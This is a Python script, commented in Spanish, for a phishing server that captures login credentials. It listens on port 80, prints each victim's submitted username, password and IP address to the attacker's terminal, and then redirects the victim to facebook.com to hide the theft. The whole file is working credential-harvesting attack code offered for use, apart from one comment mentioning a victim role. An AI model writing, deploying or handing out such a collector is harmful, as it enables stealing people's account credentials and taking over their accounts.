from http.server import BaseHTTPRequestHandler, HTTPServer
import urllib.parse
import time

# Configuración
HOST_NAME = "0.0.0.0"  # Escucha en todas las interfaces de red
PORT_NUMBER = 80       # Puerto HTTP estándar (requiere sudo en Kali)

class PhishingHandler(BaseHTTPRequestHandler):
    
    def do_POST(self):
        """Maneja las peticiones POST (cuando la víctima da clic en 'Iniciar Sesión')"""
        
        # 1. Obtener la longitud de los datos enviados
        content_length = int(self.headers['Content-Length'])
        
        # 2. Leer y decodificar el cuerpo de la petición (usuario y contraseña)
        post_data = self.rfile.read(content_length).decode('utf-8')
        
        # 3. Imprimir los datos capturados en la terminal del atacante
        print("\n" + "="*40)
        print(f"[+] ¡VÍCTIMA CAYÓ! - {time.ctime()}")
        print(f"[+] IP de origen: {self.client_address[0]}")
        print("-" * 40)
        print("DATOS CRUDOS:")
        print(post_data)
        
        # Opcional: Parsear los datos para verlos más limpios
        try:
            parsed_data = urllib.parse.parse_qs(post_data)
            print("-" * 40)
            print("CREDENCIALES DECODIFICADAS:")
            for key, value in parsed_data.items():
                print(f"{key}: {value[0]}")
        except:
            pass
        print("="*40 + "\n")

        # 4. Redireccionar a la víctima al sitio real de Facebook
        # Esto completa la ilusión y reduce sospechas (Rol de Víctima)
        self.send_response(302)
        self.send_header('Location', 'https://www.facebook.com')
        self.end_headers()

    def do_GET(self):
        """Maneja peticiones GET por si alguien entra directo a la IP"""
        self.send_response(302)
        self.send_header('Location', 'https://www.facebook.com')
        self.end_headers()

if __name__ == '__main__':
    httpd = HTTPServer((HOST_NAME, PORT_NUMBER), PhishingHandler)
    print(f"[*] Servidor de ataque iniciado en {HOST_NAME}:{PORT_NUMBER}")
    print("[*] Esperando credenciales... (Presiona Ctrl+C para detener)")
    
    try:
        httpd.serve_forever()
    except KeyboardInterrupt:
        print("\n[*] Servidor detenido.")
        httpd.server_close()